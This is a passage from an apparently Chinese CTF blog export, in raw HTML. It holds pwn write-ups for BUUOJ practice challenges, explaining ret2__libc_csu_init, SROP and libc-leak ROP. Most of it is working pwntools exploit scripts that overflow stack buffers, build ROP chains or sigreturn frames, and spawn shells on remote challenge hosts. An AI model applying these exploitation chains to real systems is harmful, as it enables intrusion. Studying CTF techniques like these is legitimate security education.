class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mov rax，0Fh    &#x2F;&#x2F;   0Fh  即15    而15 对应的是 sys_rt_sigreturn系统调用</span><br><span class=\"line\">mov rax，3Bh     &#x2F;&#x2F;  3Bh  即 59    而15 对应的是  sys_execve 系统调用</span><br></pre></td></tr></table></figure>\n<p>所以有两种方法</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">第一种：利用 ret2__libc_csu_init 去构造 execve(&quot;&#x2F;bin&#x2F;sh&quot;,0,0) 来 getshell</span><br><span class=\"line\">第二种：直接srop 伪造 sigreturn frame 去 构造 execve(&quot;&#x2F;bin&#x2F;sh&quot;,0,0) 来 getshell</span><br></pre></td></tr></table></figure>\n<h2 id=\"第一种\"><a href=\"#第一种\" class=\"headerlink\" title=\"第一种\"></a>第一种</h2><h3 id=\"ret2-libc-csu-init\"><a href=\"#ret2-libc-csu-init\" class=\"headerlink\" title=\"ret2__libc_csu_init\"></a>ret2__libc_csu_init</h3><p>既然想系统调用，我们就得传参</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">rdi &quot;&#x2F;bin&#x2F;sh&quot;的指针</span><br><span class=\"line\">rsi 0</span><br><span class=\"line\">rdx 0</span><br></pre></td></tr></table></figure>\n<p>首先想到的肯定是gadget</p>\n<p><img src=\"/2021/02/14/%E4%B8%80%E9%81%93%E6%A0%88%E9%A2%98/image-20210214154550271.png\" alt=\"image-20210214154550271\"></p>\n<p>rdi rsi 都有了但问题是没有rdx</p>\n<p>这时就可以看ida了</p>\n<p><img src=\"/2021/02/14/%E4%B8%80%E9%81%93%E6%A0%88%E9%A2%98/image-20210214162318162.png\" alt=\"image-20210214162318162\"></p>\n<p>看到有rdx</p>\n<p>这样我们就可以利用gadget了，但问题是要想获得/bin/sh的指针</p>\n<p>就需要知道栈上的地址</p>\n<p>也不知道是什么，看网上wp，都说write中有，调试了一下确实</p>\n<p>原因不太清楚</p>\n<p>接下来就是写wp了</p>\n<ol>\n<li><p>第一步我们需要得到bin/sh的指针</p>\n</li>\n<li><p>接下来第二步就是ROP，这里有一个不好理解的就是</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">call    qword ptr [r12+rbx*8]</span><br></pre></td></tr></table></figure>\n<p>因为我们r12是指向栈上的,且rbx每次都是加一，这样其实就利用了我们的gadget</p>\n</li>\n<li><p>最后就是循环调用上面的call，知道系统调用</p>\n</li>\n</ol>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#!/usr/bin/env python</span></span><br><span class=\"line\"><span class=\"comment\"># -*- coding:utf-8 -*-</span></span><br><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"comment\">#from LibcSearcher import *</span></span><br><span class=\"line\"><span class=\"comment\">#context.os='linux'</span></span><br><span class=\"line\"><span class=\"comment\">#context.log_level='debug'</span></span><br><span class=\"line\"><span class=\"comment\">#context.arch = elf.arch</span></span><br><span class=\"line\"></span><br><span class=\"line\">s       = <span class=\"keyword\">lambda</span> data               :p.send(str(data))</span><br><span class=\"line\">sa      = <span class=\"keyword\">lambda</span> delim,data         :p.sendafter(str(delim), str(data))</span><br><span class=\"line\">sl      = <span class=\"keyword\">lambda</span> data               :p.sendline(str(data))</span><br><span class=\"line\">sla     = <span class=\"keyword\">lambda</span> delim,data         :p.sendlineafter(str(delim), str(data))</span><br><span class=\"line\">r       = <span class=\"keyword\">lambda</span> num=<span class=\"number\">4096</span>           :p.recv(num)</span><br><span class=\"line\">ru      = <span class=\"keyword\">lambda</span> delims, drop=<span class=\"literal\">True</span>  :p.recvuntil(delims, drop)</span><br><span class=\"line\">itr     = <span class=\"keyword\">lambda</span>                    :p.interactive()</span><br><span class=\"line\">uu32    = <span class=\"keyword\">lambda</span> data               :u32(data.ljust(<span class=\"number\">4</span>,<span class=\"string\">'\\0'</span>))</span><br><span class=\"line\">uu64    = <span class=\"keyword\">lambda</span> data               :u64(data.ljust(<span class=\"number\">8</span>,<span class=\"string\">'\\0'</span>))</span><br><span class=\"line\">leak    = <span class=\"keyword\">lambda</span> name,addr          :log.success(<span class=\"string\">'&#123;&#125; = &#123;:#x&#125;'</span>.format(name, addr))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># io = process(\"./ciscn_2019_s_3\")</span></span><br><span class=\"line\">p = remote(<span class=\"string\">\"node3.buuoj.cn\"</span>,<span class=\"number\">28985</span>)</span><br><span class=\"line\">elf = ELF(<span class=\"string\">'./ciscn_s_3'</span>)</span><br><span class=\"line\">vuln_addr=<span class=\"number\">0x4004ED</span></span><br><span class=\"line\">mov_rax_execv_addr=<span class=\"number\">0x4004E2</span>   </span><br><span class=\"line\">pop_rdi_ret_addr=<span class=\"number\">0x4005a3</span>  </span><br><span class=\"line\">pop_rbx_rbp_r12_r13_r14_r15_ret_addr=<span class=\"number\">0x40059A</span></span><br><span class=\"line\">__libc_csu_init_addr=<span class=\"number\">0x400580</span>  <span class=\"comment\"># __libc_csu_init gadget 首地址</span></span><br><span class=\"line\">syscall_addr=<span class=\"number\">0x400501</span>             <span class=\"comment\">#ida中查看</span></span><br><span class=\"line\"></span><br><span class=\"line\">payload1=<span class=\"string\">'/bin/sh\\x00'</span>*<span class=\"number\">2</span>+p64(vuln_addr)</span><br><span class=\"line\">sl(payload1)</span><br><span class=\"line\">r(<span class=\"number\">0x20</span>)</span><br><span class=\"line\">bin_sh_addr=uu64(r(<span class=\"number\">8</span>))<span class=\"number\">-280</span></span><br><span class=\"line\">leak(<span class=\"string\">\"/bin/sh\"</span>,bin_sh_addr)</span><br><span class=\"line\">payload2=<span class=\"string\">'/bin/sh\\x00'</span>*<span class=\"number\">2</span>+p64(pop_rbx_rbp_r12_r13_r14_r15_ret_addr)+p64(<span class=\"number\">0</span>)*<span class=\"number\">2</span>+p64(bin_sh_addr+<span class=\"number\">0x50</span>)+p64(<span class=\"number\">0</span>)*<span class=\"number\">3</span></span><br><span class=\"line\">print(hex(bin_sh_addr+<span class=\"number\">0x50</span>))</span><br><span class=\"line\">payload2+=p64(__libc_csu_init_addr)+p64(mov_rax_execv_addr)</span><br><span class=\"line\">payload2+=p64(pop_rdi_ret_addr)+p64(bin_sh_addr)+p64(syscall_addr) </span><br><span class=\"line\">sl(payload2)</span><br><span class=\"line\">itr()</span><br></pre></td></tr></table></figure>\n<p><strong>这就是ret2__libc_csu_init()</strong></p>\n<h2 id=\"第二种\"><a href=\"#第二种\" class=\"headerlink\" title=\"第二种\"></a>第二种</h2><p>先介绍SROP</p>\n<h3 id=\"SROP\"><a href=\"#SROP\" class=\"headerlink\" title=\"SROP\"></a>SROP</h3><p>SROP也是栈溢出，但不同ROP的是。</p>\n<p>SROP使用能够调用sigreturn的gadget覆盖返回地址，并将一个伪造的sigcontext结构体放到栈中。</p>\n<h3 id=\"原理\"><a href=\"#原理\" class=\"headerlink\" title=\"原理\"></a><strong>原理</strong></h3><p><strong>signal机制</strong></p>\n<p>当有中断或异常产生时，内核会向某个进程发送一个signal，该进程被挂起并进入内核，然后内核为其保存上下文，再跳转到之前注册好的signal handler中进行处理</p>\n<p>待signal handler返回后，内核为该进程恢复之前保存的上下文，最终恢复执行。</p>\n<ol>\n<li>一个signal frame被添加到栈，这个frame包含了寄存器的值和一些signal信息</li>\n<li>一个新的返回地址被添加到栈顶，这个返回地址指向sigreturn调用</li>\n<li>signal handler 被调用，signal handler的行为取决于收到什么signal</li>\n<li>signal handler执行后，如果程序没有终止，则返回地址用于执行sigreturn调用</li>\n<li>sigreturn利用signal frame恢复所有寄存器以回到之前状态</li>\n<li>程序继续执行</li>\n</ol>\n<p><img src=\"/2021/02/14/%E4%B8%80%E9%81%93%E6%A0%88%E9%A2%98/image-20210214203411860.png\" alt=\"image-20210214203411860\"></p>\n<blockquote>\n<p>我们称 ucontext 以及 siginfo 这一段为 Signal Frame。</p>\n<p>其中，32 位的 sigreturn 的调用号为 77，64 位的系统调用号为 15。</p>\n</blockquote>\n<h3 id=\"攻击思路\"><a href=\"#攻击思路\" class=\"headerlink\" title=\"攻击思路\"></a>攻击思路</h3><p>系统在执行sigreturn系统调用的时候，不会对signal检查。</p>\n<p>由于sigreturn会从用户栈上恢复所有寄存器的值，而用户栈是保存在用户进程地址空间中的，是用户进程可读写的。</p>\n<p>如果攻击者控制栈，也就控制了寄存器的值。</p>\n<p><img src=\"/2021/02/14/%E4%B8%80%E9%81%93%E6%A0%88%E9%A2%98/image-20210214203929462.png\" alt=\"image-20210214203929462\"></p>\n<p><strong>一系列函数</strong></p>\n<p><img src=\"/2021/02/14/%E4%B8%80%E9%81%93%E6%A0%88%E9%A2%98/image-20210215144016291.png\" alt=\"image-20210215144016291\"></p>\n<p>需要注意的是，我们在构造 ROP 攻击的时候，需要满足下面的条件</p>\n<ul>\n<li><strong>可以通过栈溢出来控制栈的内容</strong></li>\n<li>需要知道相应的地址<ul>\n<li><strong>“/bin/sh”</strong></li>\n<li><strong>Signal Frame</strong></li>\n<li><strong>syscall</strong></li>\n<li><strong>sigreturn</strong></li>\n</ul>\n</li>\n<li>需要有够大的空间来塞下整个 sigal frame</li>\n</ul>\n<p>接下来，看我们这个题</p>\n<p>syscall sigreturn 是我们知道的</p>\n<p>接下来解决bin/sh就可以，由第一种解法我们已经知道栈上指向/bin/sh的指针</p>\n<p>接下来直接写就行</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">p = remote(<span class=\"string\">\"node3.buuoj.cn\"</span>,<span class=\"number\">29158</span>)</span><br><span class=\"line\">elf = ELF(<span class=\"string\">'./ciscn_s_3'</span>)</span><br><span class=\"line\">context.arch = elf.arch</span><br><span class=\"line\"></span><br><span class=\"line\">pop_rdi_ret = <span class=\"number\">0x04005a3</span></span><br><span class=\"line\">syscall = <span class=\"number\">0x0000000000400501</span></span><br><span class=\"line\">main_addr = elf.symbols[<span class=\"string\">'main'</span>]</span><br><span class=\"line\">vuln_addr = <span class=\"number\">0x4004ED</span></span><br><span class=\"line\">sigreturn = <span class=\"number\">0x04004DA</span></span><br><span class=\"line\"></span><br><span class=\"line\">payload1 = <span class=\"string\">\"/bin/sh\\x00/bin/sh\\x00\"</span> + p64(vuln_addr)</span><br><span class=\"line\">sl(payload1)</span><br><span class=\"line\">print(r(<span class=\"number\">0x20</span>))</span><br><span class=\"line\">binsh = u64(r(<span class=\"number\">8</span>)) - <span class=\"number\">0x118</span></span><br><span class=\"line\">leak(<span class=\"string\">\"/bin/sh\"</span>,binsh)</span><br><span class=\"line\">r(<span class=\"number\">8</span>)</span><br><span class=\"line\">sigframe = SigreturnFrame()</span><br><span class=\"line\">sigframe.rax = constants.SYS_execve</span><br><span class=\"line\">sigframe.rdi = binsh</span><br><span class=\"line\">sigframe.rsi = <span class=\"number\">0</span></span><br><span class=\"line\">sigframe.rdx = <span class=\"number\">0</span></span><br><span class=\"line\">sigframe.rip = syscall</span><br><span class=\"line\">payload = <span class=\"string\">\"/bin/sh\\x00/bin/sh\\x00\"</span> + p64(sigreturn) + p64(syscall) + str(sigframe)</span><br><span class=\"line\">sl(payload)</span><br><span class=\"line\">itr()</span><br></pre></td></tr></table></figure>\n<blockquote>\n<p>pwntools已经集成了sigreturn</p>\n</blockquote>\n","categories":[],"tags":["PWN"]},{"title":"BUU(PWN1)---栈","url":"https://pz1o.top/2021/01/23/BUU-PWN/","content":"<p>寒假开始刷题</p>\n<h1 id=\"BUU（栈）\"><a href=\"#BUU（栈）\" class=\"headerlink\" title=\"BUU（栈）\"></a>BUU（栈）</h1><h2 id=\"warmup-csaw-2016\"><a href=\"#warmup-csaw-2016\" class=\"headerlink\" title=\"warmup_csaw_2016\"></a>warmup_csaw_2016</h2><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#!/usr/bin/env python</span></span><br><span class=\"line\"><span class=\"comment\"># -*- coding:utf-8 -*-</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"comment\">#node3.buuoj.cn:28301</span></span><br><span class=\"line\">r = remote(<span class=\"string\">\"node3.buuoj.cn\"</span>,<span class=\"number\">28301</span>)</span><br><span class=\"line\"><span class=\"comment\">#r = process(\"\")</span></span><br><span class=\"line\"></span><br><span class=\"line\">payload = <span class=\"string\">b'A'</span>*(<span class=\"number\">0x40</span>+<span class=\"number\">0x8</span>) + p64(<span class=\"number\">0x40060d</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">r.sendline(payload)</span><br><span class=\"line\">r.interactive()</span><br></pre></td></tr></table></figure>\n<h2 id=\"pwn1-sctf-2016\"><a href=\"#pwn1-sctf-2016\" class=\"headerlink\" title=\"pwn1_sctf_2016\"></a>pwn1_sctf_2016</h2><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#!/usr/bin/env python</span></span><br><span class=\"line\"><span class=\"comment\"># -*- coding:utf-8 -*-</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"></span><br><span class=\"line\">r = remote(<span class=\"string\">\"node3.buuoj.cn\"</span>,<span class=\"number\">28698</span>)</span><br><span class=\"line\"><span class=\"comment\">#r = process(\"./pwn1_sctf_2016\")</span></span><br><span class=\"line\"></span><br><span class=\"line\">payload = <span class=\"string\">b'I'</span>*<span class=\"number\">20</span> + <span class=\"string\">b'A'</span>*<span class=\"number\">0x4</span> + p32(<span class=\"number\">0x08048F0D</span>)</span><br><span class=\"line\">r.sendline(payload)</span><br><span class=\"line\">r.interactive()</span><br></pre></td></tr></table></figure>\n<h2 id=\"ciscn-2019-n-1\"><a href=\"#ciscn-2019-n-1\" class=\"headerlink\" title=\"ciscn_2019_n_1\"></a>ciscn_2019_n_1</h2><p>浮点数在内存中的存储</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#include&lt;stdio.h&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">int main()</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tfloat a &#x3D; 11.28125;</span><br><span class=\"line\">\tunsigned char* p &#x3D;  (unsigned char*)&amp;a;</span><br><span class=\"line\">\tprintf(&quot;0x%x %x %x %x&quot;,*(p+3),*(p+2),*(p+1),*(p));</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#!/usr/bin/env python</span></span><br><span class=\"line\"><span class=\"comment\"># -*- coding:utf-8 -*-</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#r = remote(\"\")</span></span><br><span class=\"line\">r = remote(<span class=\"string\">\"node3.buuoj.cn\"</span>,<span class=\"number\">29611</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">payload = <span class=\"string\">'A'</span>*(<span class=\"number\">0x2c</span>) + <span class=\"string\">\"\\x00\\x80\\x34\\x41\"</span></span><br><span class=\"line\"></span><br><span class=\"line\">r.sendline(payload)</span><br><span class=\"line\"></span><br><span class=\"line\">r.interactive()</span><br></pre></td></tr></table></figure>\n<h2 id=\"第六章-CTF之PWN章-stack\"><a href=\"#第六章-CTF之PWN章-stack\" class=\"headerlink\" title=\"[第六章 CTF之PWN章]stack\"></a>[第六章 CTF之PWN章]stack</h2><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#!/usr/bin/env python</span></span><br><span class=\"line\"><span class=\"comment\"># -*- coding:utf-8 -*-</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"></span><br><span class=\"line\">r = remote(<span class=\"string\">\"node3.buuoj.cn\"</span>,<span class=\"number\">26846</span>)</span><br><span class=\"line\"><span class=\"comment\">#r = process(\"./stack\")</span></span><br><span class=\"line\"></span><br><span class=\"line\">payload = <span class=\"string\">b'A'</span>*(<span class=\"number\">0xA</span>+<span class=\"number\">0x8</span>) + p64(<span class=\"number\">0x400537</span>)</span><br><span class=\"line\">r.sendline(payload)</span><br><span class=\"line\">r.interactive()</span><br></pre></td></tr></table></figure>\n<h2 id=\"第六章-CTF之PWN章-ROP（64位系统调用）\"><a href=\"#第六章-CTF之PWN章-ROP（64位系统调用）\" class=\"headerlink\" title=\"[第六章 CTF之PWN章]ROP（64位系统调用）\"></a>[第六章 CTF之PWN章]ROP（64位系统调用）</h2><p>64位的系统调用</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">from pwn import *</span><br><span class=\"line\">p&#x3D;process(&#39;.&#x2F;rop&#39;)</span><br><span class=\"line\">elf&#x3D;ELF(&#39;.&#x2F;rop&#39;)</span><br><span class=\"line\">libc &#x3D; elf.libc</span><br><span class=\"line\">pop_rdi &#x3D; 0x4005d3</span><br><span class=\"line\">puts_got &#x3D; 0x601018</span><br><span class=\"line\">puts &#x3D; 0x400430</span><br><span class=\"line\">main &#x3D; 0x400537</span><br><span class=\"line\">rop1 &#x3D; &quot;a&quot;*18</span><br><span class=\"line\">rop1 +&#x3D; p64(pop_rdi)</span><br><span class=\"line\">rop1 +&#x3D; p64(puts_got)</span><br><span class=\"line\">rop1 +&#x3D; p64(puts)</span><br><span class=\"line\">rop1 +&#x3D; p64(main)</span><br><span class=\"line\">p.sendline(rop1)</span><br><span class=\"line\">p.recvuntil(&#39;\\n&#39;)</span><br><span class=\"line\">addr &#x3D; u64(p.recv(6).ljust(8,&#39;\\x00&#39;))</span><br><span class=\"line\">libc_base &#x3D; addr - libc.symbols[&#39;puts&#39;]</span><br><span class=\"line\">info(&quot;libc:0x%x&quot;,libc_base)</span><br><span class=\"line\">pop_rax &#x3D; 0x00000000000439c8 + libc_base</span><br><span class=\"line\">pop_rdi &#x3D; 0x000000000002155f + libc_base</span><br><span class=\"line\">pop_rsi &#x3D; 0x0000000000023e6a + libc_base</span><br><span class=\"line\">pop_rdx &#x3D; 0x0000000000001b96 + libc_base</span><br><span class=\"line\">syscall &#x3D; 0x00000000000d2975 + libc_base</span><br><span class=\"line\">binsh   &#x3D; next(libc.search(&quot;&#x2F;bin&#x2F;sh&quot;),) + libc_base</span><br><span class=\"line\">rop2 &#x3D; &quot;a&quot;*18</span><br><span class=\"line\">rop2 +&#x3D; p64(pop_rax)</span><br><span class=\"line\">rop2 +&#x3D; p64(59)</span><br><span class=\"line\">rop2 +&#x3D; p64(pop_rdi)</span><br><span class=\"line\">rop2 +&#x3D; p64(binsh)</span><br><span class=\"line\">rop2 +&#x3D; p64(pop_rsi)</span><br><span class=\"line\">rop2 +&#x3D; p64(0)</span><br><span class=\"line\">rop2 +&#x3D; p64(pop_rdx)</span><br><span class=\"line\">rop2 +&#x3D; p64(0)</span><br><span class=\"line\">rop2 +&#x3D; p64(syscall)</span><br><span class=\"line\"> </span><br><span class=\"line\">p.recvuntil(&quot;hello\\n&quot;)</span><br><span class=\"line\">p.sendline(rop2)</span><br><span class=\"line\">p.interactive()</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">p &#x3D; remote(&quot;node3.buuoj.cn&quot;,28426)</span><br><span class=\"line\">libc &#x3D; ELF(&quot;.&#x2F;libc-2.271.so&quot;)</span><br><span class=\"line\">#p &#x3D; process(&quot;.&#x2F;rop&quot;)</span><br><span class=\"line\">puts_plt &#x3D; elf.symbols[&quot;puts&quot;]</span><br><span class=\"line\">pop_rdi &#x3D; 0x4005d3</span><br><span class=\"line\">ret &#x3D; 0x400416</span><br><span class=\"line\">puts_got &#x3D; elf.got[&quot;puts&quot;]</span><br><span class=\"line\">ru(&#39;hello\\n&#39;)</span><br><span class=\"line\">payload &#x3D; b&#39;A&#39;*(0xa+0x8) + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(0x400537)</span><br><span class=\"line\">sl(payload)</span><br><span class=\"line\">puts &#x3D; u64(p.recv(6).ljust(8, &#39;\\x00&#39;))</span><br><span class=\"line\">leak(&quot;puts&quot;,puts)</span><br><span class=\"line\">libc_base &#x3D; puts-libc.symbols[&#39;puts&#39;]</span><br><span class=\"line\">sys &#x3D; libc_base + libc.symbols[&#39;system&#39;]</span><br><span class=\"line\">bin_sh &#x3D; libc_base + next(libc.search(&quot;&#x2F;bin&#x2F;sh&quot;))</span><br><span class=\"line\"># libc &#x3D; LibcSearcher(&quot;puts&quot;,puts)</span><br><span class=\"line\"># libc_base &#x3D; puts - libc.dump(&quot;puts&quot;)</span><br><span class=\"line\"># sys &#x3D; libc_base + libc.dump(&quot;system&quot;)</span><br><span class=\"line\"># bin_sh &#x3D; libc_base + libc.dump(&quot;str_bin_sh&quot;)</span><br><span class=\"line\">#gdb.attach(p)</span><br><span class=\"line\">payload &#x3D; b&#39;A&#39;*(0xa+0x8) + p64(pop_rdi) + p64(bin_sh) +p64(ret)+ p64(sys)</span><br><span class=\"line\">leak(&quot;libc_base&quot;,libc_base)</span><br><span class=\"line\"># pop_rax &#x3D; 0x00000000000439c8 + libc_base</span><br><span class=\"line\"># pop_rdi &#x3D; 0x000000000002155f + libc_base</span><br><span class=\"line\"># pop_rsi &#x3D; 0x0000000000023e6a + libc_base</span><br><span class=\"line\"># pop_rdx &#x3D; 0x0000000000001b96 + libc_base</span><br><span class=\"line\"># syscall &#x3D; 0x00000000000d2975 + libc_base</span><br><span class=\"line\"># payload &#x3D; b&#39;A&#39;*(0xa+0x8) + p64(pop_rax) + p64(59) + p64(pop_rdi) + p64(bin_sh) + p64(pop_rsi) + p64(0) + p64(pop_rdx) + p64(0) + p64(syscall)</span><br><span class=\"line\">sl(payload)</span><br><span class=\"line\">itr()</span><br></pre></td></tr></table></figure>\n<h2 id=\"jarvisoj-level0\"><a href=\"#jarvisoj-level0\" class=\"headerlink\" title=\"jarvisoj_level0\"></a>jarvisoj_level0</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#!&#x2F;usr&#x2F;bin&#x2F;env python</span><br><span class=\"line\"># -*- coding:utf-8 -*-</span><br><span class=\"line\"></span><br><span class=\"line\">from pwn import *</span><br><span class=\"line\"></span><br><span class=\"line\">#r &#x3D; remote(&quot;&quot;)</span><br><span class=\"line\">r &#x3D; remote(&quot;node3.buuoj.cn&quot;,29477)</span><br><span class=\"line\"></span><br><span class=\"line\">payload &#x3D; &#39;A&#39;*(0x88) + p64(0x400596)</span><br><span class=\"line\"></span><br><span class=\"line\">r.sendline(payload)</span><br><span class=\"line\"></span><br><span class=\"line\">r.interactive()</span><br></pre></td></tr></table></figure>\n<h2 id=\"ciscn-2019-c-1（64位的puts泄露）\"><a href=\"#ciscn-2019-c-1（64位的puts泄露）\" class=\"headerlink\" title=\"ciscn_2019_c_1（64位的puts泄露）\"></a>ciscn_2019_c_1（64位的puts泄露）</h2><p>本地可以打通</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span 